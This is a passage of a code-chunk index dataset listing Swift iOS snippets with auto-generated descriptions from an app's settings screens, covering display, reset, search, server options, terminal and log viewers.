let collectionData = [""Lime Green"", ""Red"", ""Purple"", ""Baby Blue"", ""Yellow"", ""White"", ""Orange""]
let collectionDataColors = [""99CC00"", ""FF0000"", ""800080"", ""89CFF0"", ""FFFF00"", ""FFFFFF"", ""FFA500""]

override func viewDidLoad() {"
2903,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
title = String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_DISPLAY"")

tableData = [
[String.localized(""APP_SIGNING_INPUT_VIEW_CONTROLLER_SECTION_TITLE_APPEARENCE"")],
[""Collection View""],
[],
[""Certificate Name""],
]"
2904,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function updateAppearance - updates appearance","private func updateAppearance(with style: UIUserInterfaceStyle) {
view.window?.overrideUserInterfaceStyle = style
Preferences.preferredInterfaceStyle = style.rawValue
}
}

extension DisplayViewController {"
2905,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","extension DisplayViewController - Controls user interface and application flow","extension DisplayViewController {
override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2906,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
if section == 2 {"
2907,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
var cell = UITableViewCell(style: .default, reuseIdentifier: reuseIdentifier)
cell.selectionStyle = .none

if indexPath.section == 2 {"
2908,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
if indexPath.section == 2 {"
2909,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
switch section {"
2910,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function appearanceSegmentedControlChanged - implements appearancesegmentedcontrolchanged functionality","@objc private func appearanceSegmentedControlChanged(_ sender: UISegmentedControl) {
let selectedStyle = UIUserInterfaceStyle.allCases[sender.selectedSegmentIndex]
updateAppearance(with: selectedStyle)
}

@objc private func certificateNameToggle(_ sender: UISwitch) {"
2911,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Display/DisplayViewController.swift","Function certificateNameToggle - implements certificatenametoggle functionality","@objc private func certificateNameToggle(_ sender: UISwitch) {
Preferences.certificateTitleAppIDtoTeamID = sender.isOn
}
}
"
2912,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","extension SettingsViewController - Controls user interface and application flow","extension SettingsViewController {
fileprivate func resetAlert(
title: String,
message: String,
actions: [(String, UIAlertAction.Style, () -> Void)] = [],
completion: (() -> Void)? = nil
) {"
2913,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function resetAlert - implements resetalert functionality","fileprivate func resetAlert(
title: String,
message: String,
actions: [(String, UIAlertAction.Style, () -> Void)] = [],
completion: (() -> Void)? = nil
) {"
2914,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function cacheSize - implements cachesize functionality","fileprivate func cacheSize() -> String {
var totalCacheSize = URLCache.shared.currentDiskUsage
if let nukeCache = ImagePipeline.shared.configuration.dataCache as? DataCache {"
2915,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function sourcesCount - implements sourcescount functionality","fileprivate func sourcesCount() -> String {
let l = CoreDataManager.shared.getAZSources()
return ""Source Count: \(l.count)""
}

fileprivate func downloadedCount() -> String {"
2916,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function downloadedCount - implements downloadedcount functionality","fileprivate func downloadedCount() -> String {
let l = CoreDataManager.shared.getDatedDownloadedApps()
return ""Downloaded App Count: \(l.count)""
}

fileprivate func signedCount() -> String {"
2917,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function signedCount - implements signedcount functionality","fileprivate func signedCount() -> String {
let l = CoreDataManager.shared.getDatedSignedApps()
return ""Signed App Count: \(l.count)""
}

fileprivate func certificateCount() -> String {"
2918,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function certificateCount - implements certificatecount functionality","fileprivate func certificateCount() -> String {
let l = CoreDataManager.shared.getDatedCertificate()
return ""Certificate Count: \(l.count)""
}

public func resetOptionsAction() {"
2919,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function resetOptionsAction - implements resetoptionsaction functionality","public func resetOptionsAction() {
var totalCacheSize = URLCache.shared.currentDiskUsage
if let nukeCache = ImagePipeline.shared.configuration.dataCache as? DataCache {"
2920,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function resetAllAction - implements resetallaction functionality","public func resetAllAction() {
resetAlert(
title: ""Reset All Settings"",
message: ""This action is IRREVERSIBLE. The app will go back to its original state."",
actions: [
(""Proceed"", .destructive, {"
2921,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetAlertOptions.swift","Function alertToFinish - implements alerttofinish functionality","public func alertToFinish() {
let alertController = UIAlertController(
title: """",
message: String.localized(""SUCCESS_REQUIRES_RESTART""),
preferredStyle: .alert
)

let closeAction = UIAlertAction(title: String.localized(""OK""), style: .default) { _ in"
2922,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","class ResetDataClass - implements functionality related to reset data class","class ResetDataClass {
static let shared = ResetDataClass()

init() {}"
2923,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function clearNetworkCache - implements clearnetworkcache functionality","func clearNetworkCache() {
URLCache.shared.removeAllCachedResponses()
HTTPCookieStorage.shared.removeCookies(since: Date.distantPast)

if let dataCache = ImagePipeline.shared.configuration.dataCache as? DataCache {"
2924,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function deleteSignedApps - deletes signedapps","func deleteSignedApps() {
do {"
2925,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function deleteDownloadedApps - deletes downloadedapps","func deleteDownloadedApps() {
do {"
2926,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function resetCertificates - implements resetcertificates functionality","func resetCertificates(resetAll: Bool) {
if !resetAll { Preferences.selectedCert = 0 }"
2927,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function resetSources - implements resetsources functionality","func resetSources(resetAll: Bool) {
if !resetAll { Preferences.defaultRepos = false }"
2928,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function resetAllUserDefaults - implements resetalluserdefaults functionality","private func resetAllUserDefaults() {
if let bundleID = Bundle.main.bundleIdentifier {"
2929,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function resetAll - implements resetall functionality","func resetAll() {
deleteSignedApps()
deleteDownloadedApps()
resetCertificates(resetAll: true)
resetSources(resetAll: true)
resetAllUserDefaults()
clearNetworkCache()
}

private func deleteDirectory(named directoryName: String, additionalComponents: [String]? = nil) {"
2930,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Reset/ResetDataClass.swift","Function deleteDirectory - deletes directory","private func deleteDirectory(named directoryName: String, additionalComponents: [String]? = nil) {
var directoryURL = getDocumentsDirectory().appendingPathComponent(directoryName)

if let components = additionalComponents {"
2931,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","/ View controller for managing web search settings","class SearchSettingsViewController: UITableViewController {
// MARK: - Properties

private let cellReuseIdentifier = ""SearchSettingCell""
private let switchCellReuseIdentifier = ""SearchSettingSwitchCell""
private let labelCellReuseIdentifier = ""SearchSettingLabelCell""

// Privacy manager reference
private let privacyManager = SearchPrivacyManager()
"
2932,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Section types","private enum Section: Int {
case info = 0
case features = 1
case privacy = 2
case searchTypes = 3
case exclusions = 4
case resetSection = 5
}

// Default search depth option"
2933,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

setupView()
loadSettings()
}

private func setupView() {"
2934,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function setupView - sets upview","private func setupView() {
title = ""Search Settings""

// Register cell types
tableView.register(UITableViewCell.self, forCellReuseIdentifier: cellReuseIdentifier)
tableView.register(SwitchTableViewCell.self, forCellReuseIdentifier: switchCellReuseIdentifier)
tableView.register(UITableViewCell.self, forCellReuseIdentifier: labelCellReuseIdentifier)

tableView.tableFooterView = UIView()
tableView.estimatedRowHeight = 44"
2935,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function loadSettings - implements loadsettings functionality","private func loadSettings() {
// Load default search depth
if let rawDepth = UserDefaults.standard.object(forKey: ""default_search_depth"") as? Int,
let depth = SearchDepth(rawValue: rawDepth)
{"
2936,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function doneTapped - implements donetapped functionality","@objc private func doneTapped() {
navigationController?.popViewController(animated: true)
}

// MARK: - Table View Data Source

override func numberOfSections(in _: UITableView) -> Int {"
2937,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","MARK: - Table View Data Source","override func numberOfSections(in _: UITableView) -> Int {
return 6
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2938,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch Section(rawValue: section) {"
2939,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
switch Section(rawValue: section) {"
2940,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
switch Section(rawValue: section) {"
2941,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
switch Section(rawValue: indexPath.section) {"
2942,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

switch Section(rawValue: indexPath.section) {"
2943,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","MARK: - Helper Methods","private func searchDepthString(for depth: SearchDepth) -> String {
switch depth {"
2944,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function showSearchDepthPicker - implements showsearchdepthpicker functionality","private func showSearchDepthPicker() {
let alert = UIAlertController(
title: ""Default Search Depth"",
message: ""Select the default depth for searches"",
preferredStyle: .actionSheet
)

let depths: [SearchDepth] = [.standard, .enhanced, .deep, .specialized]

for depth in depths {"
2945,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function showAddDomainAlert - implements showadddomainalert functionality","private func showAddDomainAlert() {
let alert = UIAlertController(
title: ""Add Domain to Exclusion List"",
message: ""Enter a domain name (e.g., example.com)"",
preferredStyle: .alert
)

alert.addTextField { textField in"
2946,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function showRemoveDomainAlert - implements showremovedomainalert functionality","private func showRemoveDomainAlert(at index: Int) {
guard index < excludedDomains.count else { return }"
2947,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function showResetConfirmation - implements showresetconfirmation functionality","private func showResetConfirmation() {
let alert = UIAlertController(
title: ""Reset Search Settings"",
message: ""This will restore all search settings to their default values. This cannot be undone."",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Cancel"", style: .cancel))

alert.addAction(UIAlertAction(title: ""Reset"", style: .destructive) { [weak self] _ in"
2948,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift","Function resetSearchSettings - implements resetsearchsettings functionality","private func resetSearchSettings() {
// Reset default search depth
selectedDefaultDepth = .enhanced
UserDefaults.standard.set(selectedDefaultDepth.rawValue, forKey: ""default_search_depth"")

// Reset privacy settings
privacyManager.updateSettings(
searchEnabled: true,
deepSearchEnabled: true,
crawlingEnabled: true,"
2949,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","class ServerOptionsViewController - Controls user interface and application flow","class ServerOptionsViewController: FRSTableViewController {
var isDownloadingCertifcate = false

override func viewDidLoad() {"
2950,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

tableData = [
[
""App Updates"",
],
[
""Use Server"",
String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_USE_CUSTOM_SERVER""),"
2951,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","extension ServerOptionsViewController - Controls user interface and application flow","extension ServerOptionsViewController {
override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {"
2952,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
switch section {"
2953,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .none

let cellText = tableData[indexPath.section][indexPath.row]
cell.textLabel?.text = cellText

switch cellText {"
2954,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let itemTapped = tableData[indexPath.section][indexPath.row]
switch itemTapped {"
2955,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function appUpdates - implements appupdates functionality","@objc func appUpdates(_ sender: UISwitch) {
Preferences.appUpdates = sender.isOn
}

@objc func onlinePathToggled(_ sender: UISwitch) {"
2956,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function onlinePathToggled - implements onlinepathtoggled functionality","@objc func onlinePathToggled(_ sender: UISwitch) {
Preferences.userSelectedServer = sender.isOn

let alertController = UIAlertController(
title: """",
message: String.localized(""SUCCESS_REQUIRES_RESTART""),
preferredStyle: .alert
)

let closeAction = UIAlertAction(title: String.localized(""OK""), style: .default) { _ in"
2957,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function updateCells - updates cells","private func updateCells() {
if Preferences.onlinePath != Preferences.defaultInstallPath {"
2958,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function handleInstallPathChange - implements handleinstallpathchange functionality","private func handleInstallPathChange(_ newInstallPath: String?) {
if newInstallPath != Preferences.defaultInstallPath {"
2959,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","extension ServerOptionsViewController - Controls user interface and application flow","extension ServerOptionsViewController {
func resetConfigDefault() {"
2960,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function resetConfigDefault - implements resetconfigdefault functionality","func resetConfigDefault() {
Preferences.onlinePath = Preferences.defaultInstallPath
}

func showChangeDownloadURLAlert() {"
2961,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function showChangeDownloadURLAlert - implements showchangedownloadurlalert functionality","func showChangeDownloadURLAlert() {
let alert = UIAlertController(
title: String.localized(""SETTINGS_VIEW_CONTROLLER_URL_ALERT_TITLE""),
message: nil,
preferredStyle: .alert
)

alert.addTextField { textField in"
2962,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","API key configuration methods removed as requested","@objc func textURLDidChange(_ textField: UITextField) {
guard let alertController = presentedViewController as? UIAlertController,
let setAction = alertController.actions.first(where: { $0.title == String.localized(""SET"") })"
2963,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift","Function isValidURL - checks if validurl","func isValidURL(_ url: String) -> Bool {
let urlPredicate = NSPredicate(format: ""SELF MATCHES %@"", ""https://.+"")
return urlPredicate.evaluate(with: url)
}
}
"
2964,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift","/ LaunchTerminalViewController - Button to launch the terminal / This view controller provides a simplified UI to launch the Terminal","class LaunchTerminalViewController: UIViewController {
private let containerView = UIView()
private let launchButton = UIButton(type: .system)
private let iconImageView = UIImageView()
private let descriptionLabel = UILabel()
private let logger = Debug.shared

override func viewDidLoad() {"
2965,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

title = ""Terminal""
view.backgroundColor = UIColor(named: ""Background"") ?? .systemBackground

setupUI()
setupConstraints()

logger.log(message: ""Terminal launch view controller loaded"", type: .info)"
2966,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift","Function setupUI - sets upui","private func setupUI() {
// Container view
containerView.backgroundColor = .clear
containerView.translatesAutoresizingMaskIntoConstraints = false
view.addSubview(containerView)

// Terminal icon
iconImageView.image = UIImage(systemName: ""terminal"")
iconImageView.contentMode = .scaleAspectFit
iconImageView.tintColor = .tintColor"
2967,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
// Container view
containerView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
containerView.centerYAnchor.constraint(equalTo: view.centerYAnchor),
containerView.widthAnchor.constraint(equalTo: view.widthAnchor, multiplier: 0.85),

// Icon
iconImageView.topAnchor.constraint(equalTo: containerView.topAnchor),
iconImageView.centerXAnchor.constraint(equalTo: containerView.centerXAnchor),"
2968,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift","Function launchTerminal - implements launchterminal functionality","@objc private func launchTerminal() {
logger.log(message: ""Launching terminal from launch view"", type: .info)

let terminalVC = TerminalViewController()
let navController = UINavigationController(rootViewController: terminalVC)
navController.modalPresentationStyle = .fullScreen

present(navController, animated: true)
}
}"
2969,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","class TerminalSettingsViewController - Controls user interface and application flow","class TerminalSettingsViewController: UITableViewController {
private enum SettingSection: Int, CaseIterable {"
2970,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","enum SettingSection - implements functionality related to setting section","private enum SettingSection: Int, CaseIterable {
case terminalSettings
case dangerZone
}

private enum TerminalSetting: Int, CaseIterable {"
2971,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","enum TerminalSetting - implements functionality related to terminal setting","private enum TerminalSetting: Int, CaseIterable {
case fontSize
case colorTheme
case clearHistory
}

private enum DangerZoneSetting: Int, CaseIterable {"
2972,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","enum DangerZoneSetting - implements functionality related to danger zone setting","private enum DangerZoneSetting: Int, CaseIterable {
case endSession
}

private let logger = Debug.shared
private let defaults = UserDefaults.standard

// Default settings (Server settings removed)

private var fontSize: Int {"
2973,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

// Set up the table view
title = ""Terminal Settings""
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""Cell"")
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""ValueCell"")
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""ActionCell"")

// Set initial default values if needed"
2974,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","MARK: - Table view data source","override func numberOfSections(in _: UITableView) -> Int {
return SettingSection.allCases.count
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2975,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
guard let settingSection = SettingSection(rawValue: section) else { return 0 }"
2976,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
guard let settingSection = SettingSection(rawValue: section) else { return nil }"
2977,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard let section = SettingSection(rawValue: indexPath.section) else {"
2978,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function terminalSettingsCell - implements terminalsettingscell functionality","private func terminalSettingsCell(for indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""ValueCell"", for: indexPath)
guard let setting = TerminalSetting(rawValue: indexPath.row) else { return cell }"
2979,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function dangerZoneCell - implements dangerzonecell functionality","private func dangerZoneCell(for indexPath: IndexPath) -> UITableViewCell {
let cell = tableView.dequeueReusableCell(withIdentifier: ""ActionCell"", for: indexPath)
guard let setting = DangerZoneSetting(rawValue: indexPath.row) else { return cell }"
2980,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

guard let section = SettingSection(rawValue: indexPath.section) else { return }"
2981,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function handleTerminalSettingTap - implements handleterminalsettingtap functionality","private func handleTerminalSettingTap(_ row: Int) {
guard let setting = TerminalSetting(rawValue: row) else { return }"
2982,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function handleDangerZoneTap - implements handledangerzonetap functionality","private func handleDangerZoneTap(_ row: Int) {
guard let setting = DangerZoneSetting(rawValue: row) else { return }"
2983,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","MARK: - Settings Handlers Server settings removed as requested","private func showFontSizePicker() {
let fontSizes = [10, 12, 14, 16, 18, 20, 24]
let alert = UIAlertController(title: ""Font Size"", message: nil, preferredStyle: .actionSheet)

for size in fontSizes {"
2984,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function showColorThemePicker - implements showcolorthemepicker functionality","private func showColorThemePicker() {
let themes = [""Default"", ""Light"", ""Dark"", ""Solarized""]
let alert = UIAlertController(title: ""Color Theme"", message: nil, preferredStyle: .actionSheet)

for (index, theme) in themes.enumerated() {"
2985,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function confirmClearHistory - implements confirmclearhistory functionality","private func confirmClearHistory() {
let alert = UIAlertController(
title: ""Clear Command History"",
message: ""Are you sure you want to clear your terminal command history? This action cannot be undone."",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Cancel"", style: .cancel))
alert.addAction(UIAlertAction(title: ""Clear"", style: .destructive) { _ in"
2986,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift","Function confirmEndSession - implements confirmendsession functionality","private func confirmEndSession() {
let alert = UIAlertController(
title: ""End Current Session"",
message: ""Are you sure you want to end your current terminal session?"",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Cancel"", style: .cancel))
alert.addAction(UIAlertAction(title: ""End Session"", style: .destructive) { _ in"
2987,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","class LogsViewController - Controls user interface and application flow","class LogsViewController: UIViewController {
var tableView: UITableView!
private var logTextView: UITextView!
private var logFileObserver: DispatchSourceFileSystemObject?
private var currentFileSize: UInt64 = 0
private var errCount = 0

override func viewDidLoad() {"
2988,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupNavigation()
setupViews()
startObservingLogFile()
}

override func viewDidAppear(_: Bool) {"
2989,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function viewDidAppear - implements viewdidappear functionality","override func viewDidAppear(_: Bool) {
super.viewDidAppear(false)
parseLogFile()
tableView.reloadSections(IndexSet([0]), with: .automatic)
}

fileprivate func setupNavigation() {"
2990,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
navigationItem.largeTitleDisplayMode = .never
}

fileprivate func setupViews() {"
2991,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
view.backgroundColor = .systemBackground
logTextView = UITextView()
